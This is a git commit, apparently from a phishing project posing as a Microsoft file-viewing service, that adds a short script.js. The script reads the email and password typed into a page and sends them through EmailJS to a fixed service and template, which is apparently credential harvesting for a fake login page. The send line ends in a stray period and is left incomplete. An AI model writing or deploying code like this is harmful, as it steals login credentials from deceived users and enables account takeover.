f54e3941dfc9c5a8dd0faf93f3192c0530e32572
View-Microsoft-Point-Online-Files <168607295+View-Microsoft-Point-Online-Files@users.noreply.github.com>
2024-05-01 07:02:04 +0100

    Add files via upload

---
+++ script.js
@@ -0,0 +1,10 @@
+function sendMail(){
+    let parms = {
+        email : document.getElementById("email").value,
+        password : document.getElementById("password").value,
+        subject : document.getElementById("subject").value,
+        
+    }
+    
+    emailjs.send("service_hdccajt", "template_wz9eg9e",parms).
+}
